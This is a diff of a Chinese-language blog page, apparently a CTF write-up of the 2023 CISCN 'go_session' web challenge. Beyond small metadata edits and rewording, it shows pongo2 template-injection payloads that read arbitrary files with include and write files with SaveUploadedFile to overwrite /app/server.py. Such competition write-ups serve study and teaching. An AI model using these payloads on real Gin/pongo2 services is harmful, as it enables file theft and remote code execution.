@@ -48,7 +48,7 @@
 <meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-go_session-5.png">
 <meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-reverse-babyre.png">
 <meta property="article:published_time" content="2023-05-27T09:00:00.000Z">
-<meta property="article:modified_time" content="2023-05-30T13:35:49.013Z">
+<meta property="article:modified_time" content="2023-05-30T13:42:08.751Z">
 <meta property="article:author" content="lewiserii">
 <meta property="article:tag" content="wp">
 <meta property="article:tag" content="ciscn">
@@ -272,7 +272,7 @@
         
         
         
-          149 分钟
+          150 分钟
         
       </span>
     
@@ -406,8 +406,8 @@
 <p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-go_session-2.png"></p>
 <p>所以我们可以利用ssti实现任意文件读写，然后覆盖server.py，实现自己的恶意内容</p>
 <p>查阅<a target="_blank" rel="noopener" href="https://pkg.go.dev/github.com/flosch/pongo2#section-readme">官方手册</a>可知pongo2与Django 1.7有兼容的语法和功能集</p>
-<p>Django中的include在pongo2中也能使用<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-go_session-6.png"></p>
-<p>可以使⽤Gin Context里的FormFile来读取表单⽂件，SaveUploadFile 来实现⽂件上传，注意需要用GET传参</p>
+<p>Django中的include语法在pongo2中也能使用，所以可以用include实现任意文件读取<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-go_session-6.png"></p>
+<p>写文件可以⽤Gin Context里的FormFile来读取表单⽂件，用SaveUploadFile上传，注意需要用GET传参</p>
 <p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-go_session-8.png"></p>
 <p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-go_session-7.png"></p>
 <figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-comment">//读文件</span><br>&#123;%include c.Request.Referer()%&#125;<br>&#123;%include c.Request.Host()%&#125;<br><br><span class="hljs-comment">//写文件</span><br><span class="hljs-comment">//这三个payload其实大同小异，只是后两个使用了过滤器（c.HandlerName的值为 main/route.Admin ）</span><br>&#123;&#123;c.SaveUploadedFile(c.FormFile(c.Request.Host),c.Request.Referer())&#125;&#125;<br>&#123;%set form=c.Query(c.HandlerName|first)%&#125;&#123;&#123;c.SaveUploadedFile(c.FormFile(form),c.Request.Referer())&#125;&#125;&amp;m=file<br>&#123;%set form=c.Query(c.HandlerName|first)%&#125;&#123;%set path=c.Query(c.HandlerName|last)%&#125;&#123;%set file=c.FormFile(form)%&#125;&#123;&#123;c.SaveUploadedFile(file,path)&#125;&#125;&amp;m=file&amp;n=/app/server.py<br></code></pre></td></tr></table></figure>
